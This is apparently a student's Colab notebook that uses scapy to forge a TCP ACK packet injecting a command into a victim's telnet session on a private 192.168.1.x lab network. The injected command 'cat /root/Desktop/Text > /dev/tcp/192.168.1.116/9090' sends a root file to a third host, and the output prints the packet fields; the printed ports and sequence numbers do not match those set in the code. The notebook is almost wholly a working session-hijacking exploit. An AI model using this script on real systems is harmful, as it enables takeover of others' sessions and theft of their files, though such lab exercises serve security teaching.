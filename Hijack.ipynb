{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled10.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyMca+PqHTXf8d0VjzY9AQrP",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ErikwhWu/SIT704/blob/main/Hijack.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TAuYLfQYdq5r",
        "outputId": "85693ac2-eb82-4867-a075-c5b4c515405f"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Collecting scapy\n",
            "  Downloading scapy-2.4.5.tar.gz (1.1 MB)\n",
            "\u001b[K     |████████████████████████████████| 1.1 MB 4.1 MB/s \n",
            "\u001b[?25hBuilding wheels for collected packages: scapy\n",
            "  Building wheel for scapy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for scapy: filename=scapy-2.4.5-py2.py3-none-any.whl size=1261555 sha256=e615b8a3939944bf00d818730d4233675ad7e9c3be4ad7f746fd34c657e0b599\n",
            "  Stored in directory: /root/.cache/pip/wheels/b9/6e/c0/0157e466a5e02d3ff28fc7587dff329b4a967a23b3f9b11385\n",
            "Successfully built scapy\n",
            "Installing collected packages: scapy\n",
            "Successfully installed scapy-2.4.5\n"
          ]
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import sys\n",
        "from scapy.all import *\n",
        "\n",
        "print(\"SENDING SESSION HIJACKING PACKET......\")\n",
        "\n",
        "IPLayer = IP(src=\"192.168.1.115\", dst=\"192.168.1.117\")\n",
        "TCPLayer = TCP(sport=51689, dport=23, flags=\"A\", seq=2743524230, ack=3074355898)\n",
        "Data = \"\\r cat /root/Desktop/Text > /dev/tcp/192.168.1.116/9090\\r\"\n",
        "\n",
        "pkt = IPLayer/TCPLayer/Data\n",
        "\n",
        "ls(pkt)\n",
        "send(pkt,verbose=0)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "edPdWXPbdxNy",
        "outputId": "617c6f65-718e-4535-c11b-784f67e2b578"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "SENDING SESSION HIJACKING PACKET......\n",
            "version    : BitField  (4 bits)                  = 4               ('4')\n",
            "ihl        : BitField  (4 bits)                  = None            ('None')\n",
            "tos        : XByteField                          = 0               ('0')\n",
            "len        : ShortField                          = None            ('None')\n",
            "id         : ShortField                          = 1               ('1')\n",
            "flags      : FlagsField                          = <Flag 0 ()>     ('<Flag 0 ()>')\n",
            "frag       : BitField  (13 bits)                 = 0               ('0')\n",
            "ttl        : ByteField                           = 64              ('64')\n",
            "proto      : ByteEnumField                       = 6               ('0')\n",
            "chksum     : XShortField                         = None            ('None')\n",
            "src        : SourceIPField                       = '192.168.1.115' ('None')\n",
            "dst        : DestIPField                         = '192.168.1.117' ('None')\n",
            "options    : PacketListField                     = []              ('[]')\n",
            "--\n",
            "sport      : ShortEnumField                      = 40533           ('20')\n",
            "dport      : ShortEnumField                      = 23              ('80')\n",
            "seq        : IntField                            = 3926817709      ('0')\n",
            "ack        : IntField                            = 390416241       ('0')\n",
            "dataofs    : BitField  (4 bits)                  = None            ('None')\n",
            "reserved   : BitField  (3 bits)                  = 0               ('0')\n",
            "flags      : FlagsField                          = <Flag 16 (A)>   ('<Flag 2 (S)>')\n",
            "window     : ShortField                          = 8192            ('8192')\n",
            "chksum     : XShortField                         = None            ('None')\n",
            "urgptr     : ShortField                          = 0               ('0')\n",
            "options    : TCPOptionsField                     = []              (\"b''\")\n",
            "--\n",
            "load       : StrField                            = b'\\r cat /root/Desktop/Text > /dev/tcp/192.168.1.116/9090\\r' (\"b''\")\n"
          ]
        }
      ]
    }
  ]
}